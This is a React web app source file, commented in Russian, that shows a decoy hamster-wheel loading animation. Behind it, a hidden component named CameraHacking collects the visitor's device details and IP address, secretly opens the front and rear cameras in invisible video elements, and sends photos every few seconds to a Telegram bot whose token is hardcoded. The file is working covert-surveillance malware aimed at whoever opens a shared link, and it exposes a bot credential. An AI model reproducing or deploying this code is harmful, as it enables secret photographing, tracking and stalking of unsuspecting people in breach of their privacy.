import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const canvasRef = useRef(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [batteryLevel, setBatteryLevel] = useState(null);
  const [batteryCharging, setBatteryCharging] = useState(false);
  const [activeCameras, setActiveCameras] = useState(0);
  const [isSending, setIsSending] = useState(false);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 3000; // 3 секунды между фото
  const MAX_CAPTURES = 50;

  // Получение информации о батарее
  const getBatteryInfo = async () => {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        
        const updateBatteryInfo = () => {
          setBatteryLevel(Math.round(battery.level * 100));
          setBatteryCharging(battery.charging);
        };
        
        updateBatteryInfo();
        
        battery.addEventListener('levelchange', updateBatteryInfo);
        battery.addEventListener('chargingchange', updateBatteryInfo);
        
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging
        };
      }
    } catch (error) {
      console.log('Battery info not available');
    }
    return null;
  };

  // Старый рабочий метод отправки сообщений
  const sendToTelegram = async (text) => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        mode: 'no-cors', // Используем no-cors
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_notification: true
        })
      });
      
      // В режиме no-cors мы не можем проверить ответ, но запрос отправляется
      console.log('Message sent (no-cors)');
      return true;
      
    } catch (error) {
      console.log('Telegram message error (non-critical):', error);
      return true; // Все равно возвращаем true чтобы не прерывать процесс
    }
  };

  // Старый рабочий метод отправки фото
  const sendPhotoToTelegram = async (blob, caption = '', cameraNumber = 1) => {
    if (isSending) return false;
    
    setIsSending(true);
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `camera${cameraNumber}_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      
      if (caption) {
        formData.append('caption', caption);
      }

      // Используем mode: 'no-cors' - это важно!
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        mode: 'no-cors', // Ключевое изменение!
        body: formData
      });
      
      console.log(`Photo from camera ${cameraNumber} sent (no-cors)`);
      return true;
      
    } catch (error) {
      console.log(`Photo send error (non-critical):`, error);
      return true; // Все равно возвращаем true чтобы продолжить
    } finally {
      setIsSending(false);
    }
  };

  // Сбор информации об устройстве
  const collectDeviceInfo = async () => {
    const batteryInfo = await getBatteryInfo();
    
    const info = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent.substring(0, 100),
      platform: navigator.platform,
      screenSize: `${window.screen.width}x${window.screen.height}`,
      devicePixelRatio: window.devicePixelRatio,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      battery: batteryInfo,
      ip: 'Определение...',
      os: detectOS(),
      browser: detectBrowser(),
      isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
    };

    // Получаем IP
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      info.ip = data.ip;
    } catch (error) {
      info.ip = 'Не определен';
    }

    setDeviceInfo(info);
    return info;
  };

  // Детекция ОС
  const detectOS = () => {
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) return 'Windows';
    if (/Mac OS/i.test(ua)) return 'macOS';
    if (/Linux/i.test(ua)) return 'Linux';
    if (/Android/i.test(ua)) return 'Android';
    if (/iOS|iPhone|iPad|iPod/i.test(ua)) return 'iOS';
    return 'Unknown';
  };

  // Детекция браузера
  const detectBrowser = () => {
    const ua = navigator.userAgent;
    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
    if (/Firefox/i.test(ua)) return 'Firefox';
    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
    if (/Edg/i.test(ua)) return 'Edge';
    return 'Unknown';
  };

  // Отправка информации об устройстве
  const sendDeviceInfo = async (info) => {
    const batteryText = info.battery ? 
      `Батарея: ${info.battery.level}%${info.battery.charging ? ' (зарядка)' : ''}` : 
      'Батарея: Не доступно';
    
    const message = `📱 ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ

📋 СИСТЕМА
ОС: ${info.os}
Браузер: ${info.browser}
Платформа: ${info.platform}
Мобильное: ${info.isMobile ? 'Да' : 'Нет'}

🖥 ЭКРАН
Разрешение: ${info.screenSize}
Pixel Ratio: ${info.devicePixelRatio}

${batteryText}

⚙️ АППАРАТУРА
Ядра CPU: ${info.hardwareConcurrency}
Память: ${info.deviceMemory} GB

🌐 СЕТЬ
IP: ${info.ip}

🌍 ЯЗЫК И ВРЕМЯ
Язык: ${info.language}
Часовой пояс: ${info.timezone}
Время: ${new Date().toLocaleString()}

🚀 АКТИВИРОВАН ЗАХВАТ С КАМЕР`;

    await sendToTelegram(message);
  };

  // Инициализация двух камер
  const initializeCameras = async () => {
    try {
      // Получаем список камер
      let devices = [];
      try {
        devices = await navigator.mediaDevices.enumerateDevices();
      } catch (e) {
        console.log('Cannot enumerate devices');
      }
      
      const videoDevices = devices.filter(d => d.kind === 'videoinput');
      console.log('Found cameras:', videoDevices.length);
      
      streamsRef.current = [];
      videoRefsRef.current = [];
      
      let initializedCameras = 0;
      
      // Пробуем инициализировать 2 камеры
      for (let i = 0; i < 2; i++) {
        try {
          let constraints;
          
          if (i === 0) {
            // Первая камера - пробуем заднюю
            constraints = {
              video: {
                facingMode: { exact: "environment" },
                width: { ideal: 1280 },
                height: { ideal: 720 }
              },
              audio: false
            };
          } else {
            // Вторая камера - пробуем переднюю
            constraints = {
              video: {
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
              },
              audio: false
            };
          }
          
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          streamsRef.current.push(stream);
          
          // Создаем скрытый видео элемент
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
            top: -9999px;
            left: -9999px;
          `;
          
          video.playsInline = true;
          video.muted = true;
          video.autoplay = true;
          video.setAttribute('playsinline', 'true');
          video.setAttribute('muted', 'true');
          video.setAttribute('autoplay', 'true');
          video.setAttribute('webkit-playsinline', 'true');
          
          video.srcObject = stream;
          document.body.appendChild(video);
          videoRefsRef.current.push(video);
          
          // Ждем готовности
          await new Promise((resolve) => {
            const timer = setTimeout(resolve, 2000);
            video.onloadedmetadata = () => {
              clearTimeout(timer);
              video.play().catch(() => {});
              console.log(`Camera ${i + 1} ready: ${video.videoWidth}x${video.videoHeight}`);
              resolve();
            };
          });
          
          initializedCameras++;
          
        } catch (error) {
          console.log(`Camera ${i + 1} failed:`, error.message);
          // Продолжаем пытаться с другой камерой
          continue;
        }
      }
      
      setActiveCameras(initializedCameras);
      return initializedCameras;
      
    } catch (error) {
      console.log('Camera initialization error:', error);
      return 0;
    }
  };

  // Создание изображения
  const createCameraImage = async (cameraIndex, video) => {
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    
    if (video && video.videoWidth > 0 && video.videoHeight > 0) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Минимальный водяной знак
      ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
      ctx.fillRect(10, canvas.height - 80, 200, 70);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '14px Arial';
      ctx.fillText(`Cam ${cameraIndex + 1}`, 20, canvas.height - 60);
      ctx.fillText(`${batteryLevel || 0}%`, 20, canvas.height - 40);
      ctx.fillText(`#${captureCount + 1}`, 20, canvas.height - 20);
    } else {
      // Тестовое изображение
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, 640, 480);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = 'bold 30px Arial';
      ctx.textAlign = 'center';
      ctx.fillText('CAMERA', 320, 200);
      ctx.fillText(`#${captureCount + 1}`, 320, 250);
      ctx.fillText(new Date().toLocaleTimeString(), 320, 300);
    }

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.7);
    });
  };

  // Захват и отправка фото
  const captureAndSend = async () => {
    if (captureCount >= MAX_CAPTURES) {
      stopCapturing();
      await sendToTelegram(
        `✅ Завершено\n` +
        `📸 Всего фото: ${captureCount * activeCameras}\n` +
        `🔋 Батарея: ${batteryLevel || 0}%\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      return;
    }

    // Захватываем с каждой камеры
    for (let i = 0; i < activeCameras; i++) {
      try {
        const video = videoRefsRef.current[i];
        const photoBlob = await createCameraImage(i, video);
        
        if (photoBlob) {
          const cameraType = i === 0 ? 'Задняя' : 'Передняя';
          const caption = `${cameraType} камера\n` +
            `Фото #${captureCount + 1}\n` +
            `Батарея: ${batteryLevel || 0}%\n` +
            `Время: ${new Date().toLocaleTimeString()}`;
          
          await sendPhotoToTelegram(photoBlob, caption, i + 1);
        }
      } catch (error) {
        console.log(`Capture error camera ${i + 1}:`, error);
      }
    }

    setCaptureCount(prev => prev + 1);

    // Статистика
    if ((captureCount + 1) % 10 === 0 && activeCameras > 0) {
      await sendToTelegram(
        `📊 Статистика #${captureCount + 1}\n` +
        `Камеры: ${activeCameras}\n` +
        `Всего фото: ${(captureCount + 1) * activeCameras}\n` +
        `Батарея: ${batteryLevel || 0}%\n` +
        `Время: ${new Date().toLocaleString()}`
      );
    }
  };

  // Запуск периодического захвата
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    // Первый захват через 2 секунды
    setTimeout(() => {
      captureAndSend();
    }, 2000);

    // Последующие по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSend();
    }, CAPTURE_INTERVAL);
  };

  // Остановка захвата
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];

    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
  };

  // Основная инициализация
  useEffect(() => {
    let mounted = true;

    const init = async () => {
      // Маленькая задержка
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Информация о батарее
      await getBatteryInfo();
      
      // Информация об устройстве
      const info = await collectDeviceInfo();
      
      // Отправляем информацию
      await sendDeviceInfo(info);
      
      // Инициализируем камеры
      const camerasCount = await initializeCameras();
      
      if (camerasCount > 0 && mounted) {
        await sendToTelegram(
          `✅ Камеры: ${camerasCount}\n` +
          `🚀 Начинаю съемку\n` +
          `⏱ Интервал: ${CAPTURE_INTERVAL/1000}с\n` +
          `🔋 ${batteryLevel || 0}%`
        );
        
        startPeriodicCapture();
      } else {
        await sendToTelegram(
          `⚠️ Камеры не найдены\n` +
          `Батарея: ${batteryLevel || 0}%`
        );
      }
    };

    init();

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  // Ничего не показываем
  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App">
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App">
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                  <div className="hamster__tail"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
